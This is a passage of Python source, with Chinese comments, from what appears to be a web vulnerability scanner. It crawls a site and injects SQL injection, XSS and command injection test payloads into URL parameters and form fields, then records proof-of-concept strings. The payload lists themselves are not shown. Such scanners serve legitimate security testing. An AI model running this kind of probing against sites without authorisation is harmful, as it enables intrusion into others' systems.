                            if len(content) > 50 and not content.strip().startswith("<!DOCTYPE"):
                                sensitive_found.append({
                                    "url": test_url,
                                    **info
                                })
                except:
                    pass
        
        duration = time.time() - start_time
        
        return ScanResult(
            urls=all_urls,
            forms=all_forms,
            vulnerabilities=[],
            js_files=list(all_js_files),
            sensitive_paths=sensitive_found,
            duration=duration,
            total_requests=total_requests
        )


class FullScanner:
    """完整扫描器 - 爬虫 + 漏洞检测"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.crawler = EnhancedCrawler(config)
        self.scanner = VulnerabilityScanner(config)
        # 导入表单增强模块
        from wvs.modules.forms.form_enhancer import FormEnhancer, EnhancedForm
        self.form_enhancer = FormEnhancer()
    
    def set_auth(self, cookies: Dict = None, headers: Dict = None):
        self.crawler.set_auth(cookies, headers)
        self.scanner.set_auth(cookies, headers)
    
    async def scan(self, url: str, modules: List[str] = None) -> ScanResult:
        """完整扫描"""
        modules = modules or ["sqli", "xss"]
        
        # 爬取
        result = await self.crawler.crawl(url)
        
        # 将旧版表单转换为增强型表单
        enhanced_forms = self.form_enhancer.classify_from_raw_forms(result.forms)
        
        # 漏洞检测
        vulns = []
        
        connector = aiohttp.TCPConnector(ssl=self.config.get("verify_ssl", False))
        timeout = aiohttp.ClientTimeout(total=self.scanner.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 检测 URL 参数
            for url_info in result.urls:
                # GET 参数检测
                for param in url_info.params.keys():
                    if "sqli" in modules:
                        v = await self.scanner.test_sqli(session, url_info.url, param, "GET")
                        vulns.extend(v)
                    
                    if "xss" in modules:
                        v = await self.scanner.test_xss(session, url_info.url, param, "GET")
                        vulns.extend(v)
                    
                    if "cmdi" in modules:
                        v = await self.scanner.test_cmdi(session, url_info.url, param, "GET")
                        vulns.extend(v)
            
            # 表单检测（使用增强型表单，保留所有字段）
            for form in enhanced_forms:
                for field_name in form.get_testable_fields():
                    # 获取完整的 POST 数据（保留 hidden 字段）
                    post_data = form.get_post_data(test_field=field_name, test_value="WVS_TEST_PAYLOAD")
                    
                    if "sqli" in modules:
                        v = await self._test_form_sqli(session, form, field_name, post_data)
                        vulns.extend(v)
                    
                    if "xss" in modules:
                        v = await self._test_form_xss(session, form, field_name, post_data)
                        vulns.extend(v)
        
        result.vulnerabilities = vulns
        return result
    
    async def _test_form_sqli(self, session, form, field_name: str, base_data: Dict) -> List[Vulnerability]:
        """测试表单 SQL 注入（保留完整表单参数）"""
        vulns = []
        for payload, check_str, sqli_type in self.scanner.SQLI_PAYLOADS:
            test_data = base_data.copy()
            test_data[field_name] = payload
            
            status, content, duration = await self.scanner._send_request(
                session, form.url, form.method, data=test_data
            )
            
            await asyncio.sleep(self.scanner.delay)
            
            # Time-based 检测
            if sqli_type == "time-based" and duration >= 2.5:
                vulns.append(Vulnerability(
                    type="SQL Injection (Time-based)",
                    url=form.url,
                    parameter=field_name,
                    payload=payload,
                    severity="critical",
                    confidence=0.9,
                    evidence=f"Response time: {duration:.2f}s",
                    poc=f"POST {form.url} | {field_name}={quote(payload)}"
                ))
                break
            
            # Error-based 检测
            for pattern in self.scanner.SQL_ERRORS:
                if re.search(pattern, content, re.IGNORECASE):
                    vulns.append(Vulnerability(
                        type="SQL Injection (Error-based)",
                        url=form.url,
                        parameter=field_name,
                        payload=payload,
                        severity="critical",
                        confidence=0.95,
                        evidence=content[:200],
                        poc=f"POST {form.url} | {field_name}={quote(payload)}"
                    ))
                    break
            
            if vulns:
                break
        
        return vulns
    
    async def _test_form_xss(self, session, form, field_name: str, base_data: Dict) -> List[Vulnerability]:
        """测试表单 XSS（保留完整表单参数）"""
        vulns = []
        for payload, xss_type in self.scanner.XSS_PAYLOADS:
            test_data = base_data.copy()
            test_data[field_name] = payload
            
            status, content, duration = await self.scanner._send_request(
                session, form.url, form.method, data=test_data
            )
            
            await asyncio.sleep(self.scanner.delay)
            
            confidence_info = self.scanner._assess_xss_confidence(payload, content)
            
            if confidence_info["is_xss"]:
                vulns.append(Vulnerability(
                    type=f"XSS ({xss_type})",
                    url=form.url,
                    parameter=field_name,
                    payload=payload,
                    severity=confidence_info["severity"],
                    confidence=confidence_info["confidence"],
                    evidence=confidence_info["evidence"],
                    poc=f"POST {form.url} | {field_name}={quote(payload)}"
                ))
                if confidence_info["confidence"] >= 0.7:
                    break
        
        return vulns
